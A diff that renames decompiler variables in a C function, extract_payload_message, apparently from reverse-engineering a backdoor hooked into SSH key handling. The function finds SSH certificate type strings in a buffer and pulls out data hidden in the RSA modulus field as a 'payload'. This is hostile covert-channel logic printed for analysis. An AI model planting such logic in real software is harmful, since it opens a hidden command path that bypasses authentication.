@@ -19,16 +19,16 @@ BOOL extract_payload_message
                global_context_t *ctx)
 
 {
-  uint *puVar1;
+  uint *record_tail_ptr;
   char cVar2;
-  u8 *puVar3;
-  ulong uVar4;
-  uint *puVar5;
-  uint uVar6;
-  long lVar7;
-  u8 *str;
-  uint *puVar8;
-  ulong max_len;
+  u8 *sshbuf_cursor;
+  size_t search_offset;
+  uint *modulus_field_ptr;
+  u32 be_length;
+  long cmp_index;
+  u8 *match_cursor;
+  uint *length_field_ptr;
+  size_t window_len;
   size_t modulus_length;
   u8 *modulus_data;
   size_t cert_type_namelen;
@@ -50,75 +50,75 @@ BOOL extract_payload_message
     if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
       return FALSE;
     }
-    puVar3 = sshbuf_data->d;
-    if (CARRY8((ulong)puVar3,sshbuf_size)) {
+    sshbuf_cursor = sshbuf_data->d;
+    if (CARRY8((ulong)sshbuf_cursor,sshbuf_size)) {
       return FALSE;
     }
-    uVar4 = 0;
+    search_offset = 0;
     do {
-      str = puVar3 + uVar4;
-      lVar7 = 0;
-      max_len = sshbuf_size - uVar4;
+      match_cursor = sshbuf_cursor + search_offset;
+      cmp_index = 0;
+      window_len = sshbuf_size - search_offset;
       while( TRUE ) {
-        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[lVar7];
-        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
-        lVar7 = lVar7 + 1;
-        if (lVar7 == 7) goto LAB_00107fd1;
+        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[cmp_index];
+        if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
+        cmp_index = cmp_index + 1;
+        if (cmp_index == 7) goto LAB_00107fd1;
       }
-      lVar7 = 0;
+      cmp_index = 0;
       while( TRUE ) {
-        cVar2 = ctx->STR_rsa_sha2_256[lVar7];
-        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
-        lVar7 = lVar7 + 1;
-        if (lVar7 == 7) goto LAB_00107fd1;
+        cVar2 = ctx->STR_rsa_sha2_256[cmp_index];
+        if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
+        cmp_index = cmp_index + 1;
+        if (cmp_index == 7) goto LAB_00107fd1;
       }
-      uVar4 = uVar4 + 1;
-    } while (sshbuf_size - uVar4 != 6);
-    str = (u8 *)0x0;
-    max_len = 6;
+      search_offset = search_offset + 1;
+    } while (sshbuf_size - search_offset != 6);
+    match_cursor = (u8 *)0x0;
+    window_len = 6;
 LAB_00107fd1:
-    if ((7 < uVar4) && (str != (u8 *)0x0)) {
-      uVar6 = *(uint *)(str + -8);
-      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
-      if (0x10000 < uVar6) {
+    if ((7 < search_offset) && (match_cursor != (u8 *)0x0)) {
+      be_length = *(uint *)(match_cursor + -8);
+      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
+      if (0x10000 < be_length) {
         return FALSE;
       }
-      puVar1 = (uint *)(str + ((ulong)uVar6 - 8));
-      if (puVar3 + sshbuf_size < puVar1) {
+      record_tail_ptr = (uint *)(match_cursor + ((ulong)be_length - 8));
+      if (sshbuf_cursor + sshbuf_size < record_tail_ptr) {
         return FALSE;
       }
-      uVar4 = c_strnlen((char *)str,max_len);
-      if (max_len <= uVar4) {
+      search_offset = c_strnlen((char *)match_cursor,window_len);
+      if (window_len <= search_offset) {
         return FALSE;
       }
-      puVar8 = (uint *)(str + uVar4);
-      if (puVar1 <= puVar8) {
+      length_field_ptr = (uint *)(match_cursor + search_offset);
+      if (record_tail_ptr <= length_field_ptr) {
         return FALSE;
       }
-      uVar6 = *puVar8;
-      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
-      if (0x10000 < uVar6) {
+      be_length = *length_field_ptr;
+      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
+      if (0x10000 < be_length) {
         return FALSE;
       }
-      puVar8 = (uint *)((long)puVar8 + (ulong)(uVar6 + 4));
-      if (puVar1 <= puVar8) {
+      length_field_ptr = (uint *)((long)length_field_ptr + (ulong)(be_length + 4));
+      if (record_tail_ptr <= length_field_ptr) {
         return FALSE;
       }
-      uVar6 = *puVar8;
-      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
-      if (0x10000 < uVar6) {
+      be_length = *length_field_ptr;
+      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
+      if (0x10000 < be_length) {
         return FALSE;
       }
-      puVar5 = puVar8 + 1;
-      if ((uint *)((ulong)uVar6 + (long)puVar5) <= puVar1) {
+      modulus_field_ptr = length_field_ptr + 1;
+      if ((uint *)((ulong)be_length + (long)modulus_field_ptr) <= record_tail_ptr) {
         return FALSE;
       }
-      if ((char)puVar8[1] == '\0') {
-        puVar5 = (uint *)((long)puVar8 + 5);
-        uVar6 = uVar6 - 1;
+      if ((char)length_field_ptr[1] == '\0') {
+        modulus_field_ptr = (uint *)((long)length_field_ptr + 5);
+        be_length = be_length - 1;
       }
-      sshbuf_data->d = (u8 *)puVar5;
-      *out_payload_size = (ulong)uVar6;
+      sshbuf_data->d = (u8 *)modulus_field_ptr;
+      *out_payload_size = (ulong)be_length;
       return TRUE;
     }
   }
